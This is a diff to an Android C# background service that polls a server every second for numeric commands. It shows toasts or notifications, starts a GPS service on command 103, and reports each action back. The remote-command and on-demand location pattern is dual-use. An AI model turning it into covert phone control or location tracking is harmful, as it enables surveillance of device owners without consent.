@@ -19,6 +19,8 @@ namespace KotysAndroidCsharp2
    [Service]
     public class KotysService : Android.App.Service
     {
+      
+
 
        System.Timers.Timer t2 = new System.Timers.Timer(); // timer de last seen
        System.Timers.Timer t3 = new System.Timers.Timer(); // timer de commands
@@ -28,27 +30,16 @@ namespace KotysAndroidCsharp2
 
         public override StartCommandResult OnStartCommand (Android.Content.Intent intent, StartCommandFlags flags, int startId)
         {
-            //var t = new Thread(() =>
-            //  {
-            //      do
-            //      {
-            //          Thread.Sleep(5000);
-            //          SendSastSeen();
-            //      } while (1 != 2);
-                
-               
-            //    StopSelf();
-            //    }
-            // );
            
-            
+
             //start v2
+            apicall.addReport("Device started");
 
             t2.Interval = 900000; // = 15 minutes in ms
             t2.Elapsed += new System.Timers.ElapsedEventHandler(t2_Elapsed);
             t2.Start();
 
-            t3.Interval = 1000; // = 3 minutes in ms
+            t3.Interval = 1000; // = 3 minutes in ms 18000
             t3.Elapsed += new System.Timers.ElapsedEventHandler(t3_Elapsed);
             t3.Start();
 
@@ -109,21 +100,37 @@ namespace KotysAndroidCsharp2
            
        }
 
-       void doCommand(string command, string Identifier)
+       void doCommand(string commands, string Identifiers)
        {
-           switch (command.Substring(0, 2))
+           switch (commands.Substring(0, 3))
            {
-               case "101": if (toastIT(command.Substring(3, command.Length)) == true) { apicall.markItAsDone(Identifier); } break;
-               default: break;
+               //case "101": if (toastIT(commands.Substring(3)) == true) { apicall.markItAsDone(Identifiers); } break;
+               case "101": toastIT(commands.Substring(3)); apicall.markItAsDone(Identifiers); apicall.addReport("Toast:" + commands.Substring(3)); break;
+               case "102": SendNotification(commands.Substring(3)); apicall.markItAsDone(Identifiers); apicall.addReport("Notification:" + commands.Substring(3));  break;
+               case "103": getGPS(devID, Identifiers); apicall.markItAsDone(Identifiers); break;
+               default: SendNotification("FAIL"); break;
            }
+          
 
+       }
+
+       private void SendNotification(string message)
+       {
+           
+           var nMgr = (NotificationManager)this.GetSystemService(NotificationService);
+           var notification = new Notification(Resource.Drawable.Icon, "Kotys Message");
+           var intent = new Intent();
+           intent.SetComponent(new ComponentName(this, "dart.androidapp.ContactsActivity"));
+           var pendingIntent = PendingIntent.GetActivity(this, 0, intent, 0);
+           notification.SetLatestEventInfo(this, message, message, pendingIntent);
+           nMgr.Notify(0, notification);
        }
 
 
        bool toastIT(string message)
        {
            try{
-               Toast.MakeText(this, message, ToastLength.Long);
+               Toast.MakeText(Android.App.Application.Context, message, ToastLength.Long);
                return true;
            }catch(Exception e)
            {
@@ -132,9 +139,22 @@ namespace KotysAndroidCsharp2
           
        }
 
-     
-       
 
+
+       void getGPS(string devIDs, string Idents)
+       {
+
+
+           StartService(new Intent(this, typeof(GPSService)));
+           //var activity2 = new Intent(this, typeof(GPSService));
+           //activity2.PutExtra("devident", devIDs + Idents);
+           //StartActivity(activity2);
+           
+          
+           
+       }
+
+      
         
     }
 
